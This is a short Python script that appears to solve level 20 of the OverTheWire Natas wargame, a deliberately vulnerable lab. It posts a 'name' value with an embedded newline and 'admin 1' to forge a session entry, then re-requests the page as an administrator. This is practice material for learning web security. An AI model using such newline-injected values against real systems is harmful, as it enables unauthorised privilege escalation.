#!/usr/bin/env python2

import requests
pw = open("pw").read()[:-1] # cut off \n

url = "http://natas20.natas.labs.overthewire.org/index.php?debug"
post = {"name":"wwwww\nadmin 1"}
print("reqing", url, post)

# session to save cookies across requests
s = requests.session()
r  = s.post(url, auth=("natas20", pw), data=post)
r2 = s.post(url, auth=("natas20", pw))
print(r2.text)
